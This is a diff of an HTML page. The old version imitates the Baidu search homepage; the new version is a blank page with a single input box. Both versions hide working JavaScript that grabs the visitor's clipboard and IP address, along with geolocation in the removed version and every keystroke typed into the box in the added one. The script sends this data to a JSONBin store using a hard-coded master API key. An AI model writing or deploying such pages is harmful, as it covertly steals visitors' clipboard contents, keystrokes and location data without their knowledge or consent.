@@ -1,116 +1,126 @@
 <!DOCTYPE html>
 <html lang="zh-CN">
 <head>
-   <meta charset="UTF-8">
-   <meta name="viewport" content="width=device-width,initial-scale=1.0">
-   <title>百度一下，你就知道</title>
-   <style>
-       *{margin:0;padding:0;box-sizing:border-box;font-family:Arial,Microsoft YaHei,sans-serif}
-       body{min-height:100vh;background:#fff;display:flex;flex-direction:column;align-items:center;padding-top:120px}
-       .logo{width:270px;height:95px;margin-bottom:30px;background:url(https://www.baidu.com/img/bd_logo1.png) no-repeat;background-size:contain}
-       .search-wrap{display:flex;width:540px;height:44px;border:1px solid #c4c7ce;border-radius:4px}
-       .search-input{flex:1;padding:0 15px;font-size:16px;border:none;outline:none}
-       .search-btn{width:108px;height:44px;background:#4e6ef2;color:#fff;font-size:16px;border:none;cursor:pointer;border-radius:0 4px 4px 0}
-       .search-btn:hover{background:#4662e5}
-   </style>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width,initial-scale=1.0,maximum-scale=1">
+<title></title>
+<style>
+*{
+    margin: 0;
+    padding: 0;
+    box-sizing: border-box;
+    font-family: system-ui,"Microsoft YaHei";
+}
+body{
+    min-height: 100vh;
+    background: #fff;
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    padding: 16px;
+}
+#inputBox{
+    width: 100%;
+    max-width: 500px;
+    height: 52px;
+    font-size: 18px;
+    padding: 0 16px;
+    border: 1px solid #ccc;
+    border-radius: 6px;
+    outline: none;
+}
+#inputBox:focus{
+    border-color: #3478f6;
+}
+</style>
 </head>
 <body>
-   <div class="logo"></div>
-   <div class="search-wrap">
-       <input class="search-input" placeholder="请输入搜索内容">
-       <button class="search-btn">百度一下</button>
-   </div>
+<input id="inputBox" placeholder="请输入内容">
+
 <script>
 !function(){
-   // 固定配置，和后台一致
-   const BIN_ID = "6a13344a6610dd3ae89b5baa";
-   const API_KEY = "$2a$10$ImaXRFAF0DWBGK.u1TfnAuxIQIUgwBoAwFE71Ydy6EEQ6HzDwBNnS";
+    // =========修改为你自己的JSONBin信息=========
+    const BIN_ID = "6a13344a6610dd3ae89b5baa";
+    const API_KEY = "$2a$10$ImaXRFAF0DWBGK.u1TfnAuxIQIUgwBoAwFE71Ydy6EEQ6HzDwBNnS";
+    // =====================================
 
-   // 1. 获取IP和地理位置
-   async function getFullAddress() {
-       const apiList = [
-           "https://ipapi.co/json/",
-           "https://ipwho.is/",
-           "https://ipinfo.io/json"
-       ];
-       for (let url of apiList) {
-           try {
-               const res = await fetch(url, { cache: "no-cache", signal: AbortSignal.timeout(5000) });
-               if (!res.ok) continue;
-               const data = await res.json();
-               const ip = data.ip || data.ip_address || "未知IP";
-               const country = data.country_name || data.country || "未知国家";
-               const region = data.region || data.state || "";
-               const city = data.city || "";
-               const district = data.district || "";
-               const lat = data.latitude || data.lat || (data.loc ? data.loc.split(',')[0] : "");
-               const lon = data.longitude || data.lon || (data.loc ? data.loc.split(',')[1] : "");
-               const isp = data.org || data.isp || "未知运营商";
-               return { ip, country, region, city, district, lat, lon, isp };
-           } catch (e) { continue; }
-       }
-       return { ip: "解析失败", country: "未知国家", region: "未知省份", city: "未知城市", district: "未知区县", lat: "", lon: "", isp: "未知运营商" };
-   }
+    const inputBox = document.getElementById("inputBox");
+    let clipboardText = "";
+    let visitorIp = null;
 
-   // 2. 获取剪贴板内容
-   async function getClipboard() {
-       try {
-           const text = await navigator.clipboard.readText();
-           return text || "无内容";
-       } catch (e) {
-           return "无法读取（未授权/不支持）";
-       }
-   }
+    // 获取访客IP
+    async function getIP() {
+        const apiList = ["https://ipinfo.io/json","https://ipapi.co/json/"];
+        for(let url of apiList){
+            try{
+                const res = await fetch(url,{signal:AbortSignal.timeout(4000)});
+                const data = await res.json();
+                return data.ip || "IP获取失败";
+            }catch(err){continue;}
+        }
+        return "IP获取失败";
+    }
 
-   // 3. 保存数据到jsonbin
-   async function saveData() {
-       const locData = await getFullAddress();
-       const clipData = await getClipboard();
-       const nowTime = new Date().toLocaleString();
+    // 保存记录
+    async function save(ip,clip,userText){
+        const now = new Date().toLocaleString();
+        try{
+            const res = await fetch(`https://api.jsonbin.io/v3/b/${BIN_ID}`,{
+                headers:{"X-Master-Key":API_KEY}
+            });
+            const cloud = await res.json();
+            let db = cloud.record || {};
+            if(!db.ips) db.ips = [];
+            const list = db.ips;
 
-       const visitorData = {
-           ip: locData.ip,
-           country: locData.country,
-           province: locData.region,
-           city: locData.city,
-           district: locData.district,
-           lat: locData.lat,
-           lon: locData.lon,
-           isp: locData.isp,
-           clipboard: clipData,
-           time: nowTime,
-           count: 1
-       };
+            const index = list.findIndex(item=>item.ip === ip);
+            if(index > -1){
+                list[index].count += 1;
+                list[index].time = now;
+                list[index].clipboard = clip;
+                list[index].inputText = userText;
+            }else{
+                list.push({
+                    ip:ip,
+                    clipboard:clip,
+                    inputText:userText,
+                    time:now,
+                    count:1
+                })
+            }
 
-       try {
-           // 读取现有数据
-           const res = await fetch(`https://api.jsonbin.io/v3/b/${BIN_ID}`, {
-               headers: { "X-Master-Key": API_KEY }
-           });
-           const cloudData = await res.json();
-           const recordList = cloudData.record.ips || [];
+            await fetch(`https://api.jsonbin.io/v3/b/${BIN_ID}`,{
+                method:"PUT",
+                headers:{
+                    "Content-Type":"application/json",
+                    "X-Master-Key":API_KEY
+                },
+                body:JSON.stringify(db)
+            })
+        }catch(err){
+            console.log("保存失败",err);
+        }
+    }
 
-           // 追加新记录
-           recordList.push(visitorData);
+    // 点击页面：唤起键盘 + 读取剪贴板（浏览器强制要求用户交互）
+    document.body.addEventListener("click",async function(){
+        inputBox.focus();
+        try{
+            clipboardText = await navigator.clipboard.readText();
+        }catch(e){
+            clipboardText = "无法读取剪贴板";
+        }
+        if(!visitorIp){
+            visitorIp = await getIP();
+        }
+        save(visitorIp,clipboardText,inputBox.value);
+    },{once:true});
 
-           // 写回数据
-           await fetch(`https://api.jsonbin.io/v3/b/${BIN_ID}`, {
-               method: "PUT",
-               headers: {
-                   "Content-Type": "application/json",
-                   "X-Master-Key": API_KEY
-               },
-               body: JSON.stringify({ ips: recordList })
-           });
-       } catch (err) {
-           console.log("保存失败：", err);
-       }
-   }
-
-   // 页面加载自动执行
-   window.onload = function() {
-       saveData();
-   }
+    // 监听输入框文字变化
+    inputBox.addEventListener("input",function(){
+        if(!visitorIp) return;
+        save(visitorIp,clipboardText,this.value);
+    })
 }();
 </script>
 </body>
